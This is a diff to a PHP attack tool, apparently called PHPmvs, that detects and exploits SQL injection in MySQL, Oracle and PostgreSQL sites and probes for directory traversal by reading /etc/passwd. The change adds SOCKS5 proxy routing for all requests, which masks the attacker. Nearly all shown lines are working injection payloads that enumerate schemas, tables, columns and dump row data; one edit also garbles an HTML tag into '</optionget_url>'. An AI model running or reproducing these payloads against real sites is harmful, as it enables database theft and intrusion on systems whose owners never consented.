@@ -1,8 +1,9 @@
 <?php
 /* 
 By Diego Cardenas "The Samedog" under the GNU GENERAL PUBLIC LICENSE Version 2, June 1991 e-mail: the.samedog[at]gmail.com.
-Updating this just for the sake of it, versioning is not needed anymore so this will be called "PHPmvs" from now on.
 */
+$soft_ver="4.5";
+
 $disclaimer = "Usage of this script for attacking websites WITHOUT permission of the owner is illegal. Developer is not responsible for any damage caused by this.";
 
 //most queries are modded sqlmap generated queries http://sqlmap.sourceforge.net/
@@ -500,10 +501,13 @@ function html_header($plus = "")
 //Functions for queries and stuffs
 
 //find wich method is available, if none, you are REALLY fucked :c
-function get_url($url){
+function get_url($url,$proxy){
 	if(function_exists('curl_version')==true){
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, $url);
+		if ($proxy != 0 or $proxy != "" or $proxy != NULL){
+			curl_setopt($ch, CURLOPT_PROXY, "socks5://".$proxy);
+		}
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		$output = curl_exec($ch);
 		curl_close($ch);
@@ -623,9 +627,9 @@ function framemvs1()
 function framemvs2()
 {
     //main frame
-    global $action, $disclaimer;
+    global $action, $disclaimer,$soft_ver;
     html_header();
-    echo "<h1>PHPmvs</h1>
+    echo "<h1>PHPmvs $soft_ver</h1>
 	 <div>
 	 <br><b><h4></size>DIS-FUCKING-CLAIMER: " . $disclaimer . "</h4></b><br>
 	Usage: <br>
@@ -653,8 +657,7 @@ function frameset()
 }
 function frame1()
 {
-    global $string3, $mode_eb, $a, $b, $c, $d, $error_messages;
-    global $action;
+    global $string3, $mode_eb, $a, $b, $c, $d, $error_messages,$s5_ip, $s5_port, $action, $proxy;
     html_header();
     
     echo "<body>\n
@@ -669,6 +672,14 @@ function frame1()
 	<input type=\"checkbox\" name=\"checkerror\" id=\"checkerror\" value=\"check_e\" checked>Test for Error-based ||
 	<input type=\"checkbox\" name=\"checknion\" id=\"checknion\" value=\"check\"> Test for UNION query (slow) ||
 	<input type=\"checkbox\" name=\"speed\" id=\"speed\" value=\"speed\" checked> Fast scan (show only first injection point per vulnerability)
+	<br><br>
+	<div>
+	Socks 5 proxy (optional, only if Curl is available).<br>
+	<pre>
+IP:   <input type=\"text\" name=\"s5_ip\" id=\"s5_ip\" size=\"15\"/>
+Port: <input type=\"text\" name=\"s5_port\" id=\"s5_port\" size=\"5\"/>
+	</pre
+	</div>
 	</form> 
 	";
     if (isset($_POST['forma']) && $_POST['forma'] == 'search') {
@@ -677,10 +688,17 @@ function frame1()
         if (strpos($url, "&") == true) {
             echo "<b>Multiple parameter url detected</b><br/>";
         }
-        $check  = @$_POST["checknion"];
-        $checke = @$_POST["checkerror"];
-        $break  = @$_POST["speed"];
+        $check   = @$_POST["checknion"];
+        $checke  = @$_POST["checkerror"];
+        $break   = @$_POST["speed"];
+        $s5_ip   = @$_POST["s5_ip"];
+        $s5_port  = @$_POST["s5_port"];
         //i suck at names... and coding
+        if ($s5_port != "" and $s5_port != NULL){
+			$proxy="$s5_ip:$s5_port";
+		}else{
+			$proxy=0;
+		}
         
         //echo "<br><div align=\"left\">" . get_server_info($url) . "</div>";
         $eurl_a   = explode("&", $url);
@@ -697,9 +715,9 @@ function frame1()
             $payload2 = $url2 . "+and+1=2" . $sobras[1];
             $payload3 = $url2 . "'" . $sobras[1];
             
-            $url_s  = get_url($payload);
-            $url_s2 = get_url($payload2);
-            $url_s3 = get_url($payload3);
+            $url_s  = get_url($payload,$proxy);
+            $url_s2 = get_url($payload2,$proxy);
+            $url_s3 = get_url($payload3,$proxy);
 
             if (md5($url_s) != md5($url_s2) or md5($url_s3) != md5($url)) {
                 foreach($error_messages as $key=>$value){
@@ -720,7 +738,7 @@ function frame1()
 					foreach ($a as $detectar) {
 						echo "."; //LOL "progress bar"		
 						$payload = $url2.$detectar.$sobras[1];
-						$html = get_url($payload);
+						$html = get_url($payload,$proxy);
 						if (strpos($html, $string3)) {
 							$mode_eb = $as;
 							echo "<div><font color=blue>Detected: MySQL error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
@@ -745,7 +763,7 @@ function frame1()
 						foreach ($b as $detectar2) {
 							echo "."; //LOL "progress bar"
 							$payload = $url2 . $detectar2 . $sobras[1];
-							$html8   = get_url($payload);
+							$html8   = get_url($payload,$proxy);
 							if (strpos($html8, $string3)) {
 								$mode_uq = $ass;
 								echo "<div><font color=blue>Detected: MySQL UNION query injection =)</font><br>URL:<font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar2</font></div>
@@ -770,7 +788,7 @@ function frame1()
 						$asd = 1;
 						foreach ($c as $detectar) {
 							echo "."; //LOL "progress bar"
-							$html = get_url($url2 . $detectar . $sobras[1]);
+							$html = get_url($url2 . $detectar . $sobras[1],$proxy);
 							if (strpos($html, $string3) == true) {
 								$mode_oeb = $asd;
 								echo "<div><font color=blue>Detected: Oracle error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
@@ -795,7 +813,7 @@ function frame1()
 						$asdf = 1;
 						foreach ($d as $detectar) {
 							echo "."; //LOL "progress bar"
-							$html = get_url("$url2+$detectar+$sobras[1]");
+							$html = get_url("$url2+$detectar+$sobras[1]",$proxy);
 							if (strpos($html, $string3) == true) {
 								$mode_pg = $asdf;
 								echo "<div><font color=blue>Detected: PostgreSQL error based injection =)</font> <br>URL:  <font size=2 color=red>$url2</font>$sobras[1]<br/>QUERY: <font size=2 color=red>$detectar</font></div>
@@ -859,13 +877,13 @@ function frame2()
         if ($mode == "mysql_error") {
             $queryn   = str_replace("$payload_error", '(SELECT+7288+FROM(SELECT+COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT+MID((IFNULL(CAST(schema_name+AS+CHAR),0x20)),1,50)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+$i,1),0x3a70687a3a,floor(rand(0)%2A2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)', $query);
             $i        = 0;
-            $count    = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count    = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $tablasss = "tables e-b";
         } elseif ($mode == "mysql_union") {
             $queryn   = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", 'CONCAT(0x3a6f79753a,IFnull(CAST(SCHEMA_NAME+AS+CHAR),0x20),0x3a70687a3a)', $query);
 			$queryn   = str_replace("%23", '+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+$i,1%23', $queryn);
             $i        = 0;
-            $count    = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count    = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $tablasss = "tables u-q";
         } elseif ($mode == "oracle_error") {
             $queryn   = str_replace("$payload_oracle", "(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(USER%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20DUAL)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))", $query);
@@ -881,11 +899,11 @@ function frame2()
             while ($i <= $count) {
                 //echo $count;
                 $query_nombre = str_replace('$i', "$i", $queryn);
-                $nombre       = GetBetween(get_url($url . $query_nombre . $sobras));
+                $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
 				if($nombre=="" || $nombre==null && $mode == "mysql_union"){
 					$querys = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", "CONCAT(0x3a6f79753a,database(),0x3a70687a3a)", $query);
 					$query_nombre = str_replace("%23", "+FROM+INFORMATION_SCHEMA.SCHEMATA%23", $querys);
-					$nombre       = GetBetween(get_url($url . $query_nombre . $sobras));
+					$nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
 					echo "<option value=\"" . $nombre . "\">$nombre</option>";
 					break;
 				}else{
@@ -942,32 +960,32 @@ function frame3()
         if ($mode == "mysql_error") {
             $query_n    = str_replace("$payload_error", '(SELECT%207288%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(table_name%20AS%20CHAR),0x20)),1,50)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20' . $database . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
             $i          = 0;
-            $count      = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $columnasss = "columns e-b";
             
         } elseif ($mode == "mysql_union") {
             $query_n    = str_replace("%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()", "%23", $query);
             $query_n    = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(table_name%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20' . $database . '%20LIMIT%20$i,1)', $query_n);
             $i          = 0;
-            $count      = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $columnasss = "columns u-q";
         } elseif ($mode == "oracle_error") {
             $query_n = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(TABLE_NAME%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20TABLE_NAME%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_TABLES%20WHERE%20OWNER%20IN%20(' . $database2 . ')%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
             
             $i          = 1;
-            $count      = (GetBetween(get_url($url . $querys . $sobras)));
+            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)));
             $columnasss = "columns o-eb";
         } elseif ($mode == "postgre_error") {
             $query_n    = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(tablename%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20pg_tables%20WHERE%20schemaname%20IN%20((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))%20OFFSET%20$i%20LIMIT%201)', $query);
             $i          = 0;
-            $count      = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $columnasss = "columns pg";
         }
         print $count;
         while ($i <= $count) {
             $query_nombre = str_replace('$i', "$i", $query_n);
-            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras));
-            echo "<option value=\"" . hexEncode($nombre) . "\">$nombre</option>";
+            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
+            echo "<option value=\"" . hexEncode($nombre) . "\">$nombre</optionget_url>";
             $i++;
         }
         
@@ -1022,28 +1040,28 @@ function frame4()
         if ($mode == "mysql_error") {
             $query_n = str_replace("$payload_error", '(SELECT%205724%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(column_name%20AS%20CHAR),0x20)),1,50)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D' . $table_n . '%20AND%20table_schema%3D' . $database . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
             $i       = 0;
-            $count   = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $datos   = "data e-b";
             
         } elseif ($mode == "mysql_union") {
             $query_n = str_replace("$payload_union", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(column_name%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D' . $table_n . '%20AND%20table_schema%3D' . $database . '%20LIMIT%20$i,1)', $query);
             $i       = 0;
-            $count   = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $datos   = "data u-q";
         } elseif ($mode == "oracle_error") {
             $query_n = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(COLUMN_NAME%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20COLUMN_NAME%2CDATA_TYPE%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_TAB_COLUMNS%20WHERE%20TABLE_NAME%3D' . $table_n3 . '%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
             $i       = 1;
-            $count   = (GetBetween(get_url($url . $querys . $sobras)));
+            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)));
             $datos   = "data o-eb";
         } elseif ($mode == "postgre_error") {
             $query_n = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(attname%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid%3Db.attrelid%20WHERE%20a.relnamespace%3Dpg_namespace.oid%20AND%20pg_type.oid%3Db.atttypid%20AND%20attnum%3E0%20AND%20a.relname%3D(' . $table_n3 . ')%20AND%20nspname%3D(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))%20OFFSET%20$i%20LIMIT%201)', $query);
             $i       = 0;
-            $count   = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
             $datos   = "data pg";
         }
         while ($i <= $count) {
             $query_nombre = str_replace('$i', "$i", $query_n);
-            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras));
+            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
             echo "<input type=\"checkbox\" name=\"nombre[]\" id=\"nombre\" value=\"" . hexEncode($nombre) . "\">$nombre</input><br>";
             $i++;
         }
@@ -1091,27 +1109,27 @@ function frame6()
                 if ($mode == "mysql_error") {
                     $queryn = str_replace("$payload_error", '(SELECT%206968%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(' . asciiEncode($nombres) . '%20AS%20CHAR),0x20)),1,50)%20FROM%20' . asciiEncode($database) . '.' . $tabla . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
                     $i      = 0;
-                    $count  = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                 } elseif ($mode == "mysql_union") {
                     $queryn = str_replace("$payload_union", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(' . asciiEncode($nombres) . '%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20' . asciiEncode($database) . '.' . $tabla . '%20LIMIT%20$i,1)', $query);
                     $i      = 0;
-                    $count  = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                 } elseif ($mode == "oracle_error") {
                     $queryn = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(' . asciiEncode($nombres) . '%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20' . asciiEncode($nombres) . '%2CROWNUM%20AS%20LIMIT%20FROM%20' . $database . '.' . $tabla . '%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
                     $i      = 0;
-                    $count  = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                     
                 } elseif ($mode == "postgre_error") {
                     $queryn = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(' . asciiEncode($nombres) . '%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20public.' . $tabla . '%20OFFSET%20$i%20LIMIT%201)', $query);
                     $i      = 0;
-                    $count  = (GetBetween(get_url($url . $querys . $sobras)) - 1);
+                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                     
                 }
                 echo "</tr>";
                 while ($i <= $count) {
                     
                     $query_nombre = str_replace('$i', "$i", $queryn);
-                    $nombre       = GetBetween(get_url($url . $query_nombre . $sobras));
+                    $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
                     echo "<tr><td>" . $nombre . "</td>";
                     $i++;
                 }
@@ -1197,8 +1215,9 @@ function PHPapf_frame()
 ///////PHPswc ends------------------------------------------------------------
 function phpswc_frame()
 {
-    global $action;
+    global $action,$proxy;
     html_header();
+    $proxy=0;
     ini_set('memory_limit', '-1');
     echo "<body>\n
 		<div align=left><h1>PHPswc</h1></div><br><br>
@@ -1220,7 +1239,7 @@ function phpswc_frame()
         //$Start = getTime();
         $link_to_dig   = $_POST['url'];
         $maxlinks      = $_POST['links'];
-        $original_file = @get_url($link_to_dig);
+        $original_file = @get_url($link_to_dig,$proxy);
         $path_info     = parse_url($link_to_dig);
         $base          = $path_info['scheme'] . "://" . $path_info['host'];
         $stripped_file = strip_tags($original_file, "<a>");
@@ -1254,7 +1273,7 @@ function phpswc_frame()
             if ($maxlonks >= $maxlinks) {
                 break;
             }
-            $original_file2 = @get_url($echo);
+            $original_file2 = @get_url($echo,$proxy);
             $path_info2     = parse_url($echo);
             $base2          = $path_info2['scheme'] . "://" . $path_info2['host'];
             $stripped_file2 = strip_tags($original_file2, "<a>");
@@ -1351,9 +1370,9 @@ function PHPfuz_frame()
 /////PHPdt
 function PHPdt_frame()
 {
-    global $action, $dt;
+    global $action, $dt,$proxy;
     html_header();
-    
+    $proxy = 0;
     echo "<body>\n
 	<div align=left><h1>PHPdt</h1></div><br><br>
 	<br>Thing is simple, just enter the url (http://www.example.com/lol.php?file=some/shit.php) and WAIT.<br><br><br> 
@@ -1362,6 +1381,7 @@ function PHPdt_frame()
 	URL: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" value=\"http://\"/>    <input type=\"submit\" name=\"ports\" id=\"ports\" value=\"scan\"/><br>
 	</form> 
 	";
+	
     if (isset($_POST['ports']) && $_POST['ports'] == 'scan') {
         $url = $_POST['url'];
         $a = explode("=", $url);
@@ -1373,7 +1393,7 @@ function PHPdt_frame()
         echo "<br><br><br>";
         foreach ($dt as $url2) {
             $traversal  = $c.$url2;
-            $resultadox = @get_url($traversal);
+            $resultadox = @get_url($traversal,$proxy);
             if (strpos($resultadox, "root:x:")) {
                 echo "<font color=red>Directory Traversal found:</font> " . $traversal . "<br>";
                 $status = "1";
